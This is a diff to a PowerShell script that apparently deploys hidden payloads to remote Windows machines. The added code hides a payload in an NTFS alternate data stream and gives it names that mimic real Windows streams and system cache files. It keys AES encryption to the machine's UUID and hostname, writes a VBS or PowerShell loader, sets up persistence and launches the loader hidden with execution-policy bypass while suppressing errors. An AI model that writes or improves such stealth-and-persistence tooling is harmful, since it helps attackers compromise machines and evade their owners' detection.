@@ -20,26 +20,37 @@ function Get-RandomADSConfig {
     $adj = @('Sys','Kernel','Cache','Log','Data','Temp','Boot','User')
     $noun = @('Mgr','Svc','Util','Chk','Idx','Core','Stream','Host')
     $exts = @('.dat','.log','.idx','.tmp','.chk')
-    $ntfsStreams = @('$EA','$OBJECT_ID','$SECURITY_DESCRIPTOR','$LOGGED_UTILITY_STREAM')
+    
+    # Calculate AES key
     $seed = (Get-CimInstance Win32_ComputerSystemProduct).UUID + $env:COMPUTERNAME
     $sha256 = [System.Security.Cryptography.SHA256]::Create()
     $keyBytes = $sha256.ComputeHash([Text.Encoding]::UTF8.GetBytes($seed))
     
+    # Calculate stream name options
+    $legitimateStreams = @('Zone.Identifier', 'SmartScreen', 'Catalog', 'appcompat.txt')
+    $randomStream = -join (1..8 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 122) })
+    
+    # Return configuration hashtable
     @{
         HostPath = if($Randomize) { 
-            (Resolve-Path ~).Path + '\' + ($adj|Get-Random) + ($noun|Get-Random) + ($exts|Get-Random)
-        } else { 'C:\ProgramData\SystemCache.dat' }
-        # Use stream names that mimic legitimate Windows ADS
-        $legitimateStreams = @('Zone.Identifier', 'SmartScreen', 'Catalog', 'appcompat.txt')
-        $randomStreams = @(1..8 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 122) }) -join ''
+            "C:\ProgramData\$(Get-Random -InputObject $adj)$(Get-Random -InputObject $noun)$(Get-Random -InputObject $exts)"
+        } else { 
+            'C:\ProgramData\SystemCache.dat' 
+        }
         
-        $randomStream = (1..8 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 122) }) -join ''
         StreamName = if($Randomize) { 
-            ':' + (Get-Random -InputObject $legitimateStreams + $randomStream)
-        } else { ':syc_payload' }
-        # Generate 32-byte key from UUID + hostname
-        AESKey = [Convert]::ToBase64String($keyBytes)  # Guaranteed 44-char Base64 string (32 bytes)
-        VBSPrefix = if($Randomize) { 'app_log_' + ((1..6|%{Get-Random -Min 97 -Max 123|%{[char]$_}})-join'') + '.' } else { 'app_log_a.' }
+            ':' + (Get-Random -InputObject ($legitimateStreams + $randomStream))
+        } else { 
+            ':syc_payload' 
+        }
+        
+        AESKey = [Convert]::ToBase64String($keyBytes)
+        
+        VBSPrefix = if($Randomize) { 
+            'app_log_' + (-join (1..6 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 123) })) + '.'
+        } else { 
+            'app_log_a.' 
+        }
     }
 }
 
@@ -215,6 +226,9 @@ function Invoke-RemoteDeployment($Target, $PayloadObj, $PersistList, $RandomizeF
         "function New-PersistenceMechanism { $( ${function:New-PersistenceMechanism}.ToString() ) }"
     ) -join "`n`n"
     
+    # Escape single quotes in payload for safe embedding
+    $payloadEscaped = $PayloadObj -replace "'","''"
+    
     $remoteBlock = [scriptblock]::Create(@"
 `$ErrorActionPreference = 'SilentlyContinue'
 
@@ -227,27 +241,25 @@ $allFunctions
 `$Encrypt = `$$EncryptFlag
 `$NoExec = `$$NoExecFlag
 
-$remoteBlock = [scriptblock]::Create(@"
-...
-`$rawPayload = ConvertTo-PSPayload `$using:PayloadText
-...
-"@)
+# Convert payload
+`$rawPayload = ConvertTo-PSPayload '$payloadEscaped'
 
-Invoke-Command ... -ArgumentList $PayloadObj
-
+# Create ADS and loader
 `$cfg = Get-RandomADSConfig
 `$adsPath = New-ADSPayload `$cfg.HostPath `$cfg.StreamName `$rawPayload `$cfg
 `$loaderPath = New-Loader `$adsPath `$cfg
 
+# Set persistence
 foreach(`$pType in @('$($PersistList -join "','")')) { 
     New-PersistenceMechanism `$pType `$loaderPath `$cfg 
 }
 
+# Execute if requested
 if(-not `$NoExec) { 
     if(`$loaderPath.EndsWith('.vbs')) { 
-        Start-Process wscript.exe -ArgumentList "//B ```"`$loaderPath```"" -WindowStyle Hidden 
+        Start-Process wscript.exe -ArgumentList @('//B', `$loaderPath) -WindowStyle Hidden -NoNewWindow
     } else { 
-        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -File ```"`$loaderPath```"" -WindowStyle Hidden
+        Start-Process powershell.exe -ArgumentList @('-WindowStyle', 'Hidden', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', `$loaderPath) -WindowStyle Hidden -NoNewWindow
     }
 }
 
